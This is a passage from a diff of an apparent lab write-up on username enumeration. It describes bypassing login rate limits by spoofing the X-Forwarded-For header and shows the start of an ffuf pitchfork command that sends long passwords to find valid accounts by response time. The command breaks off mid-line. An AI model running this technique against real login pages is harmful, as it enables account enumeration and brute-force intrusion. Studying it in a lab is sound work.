@@ -19,7 +19,7 @@ To bypass rate limiting, the attacker adds the `X-Forwarded-For` header with dif
 
 Using ffuf in pitchfork mode, the attacker enumerates usernames and sorts results by response time to identify valid accounts.
 ## 5. Payload / Technique
-`bash
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ ffuf -w usernames.txt:W1 -w num.txt:W2 \   
      -X POST -d "username=W1&password=goodddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd" \
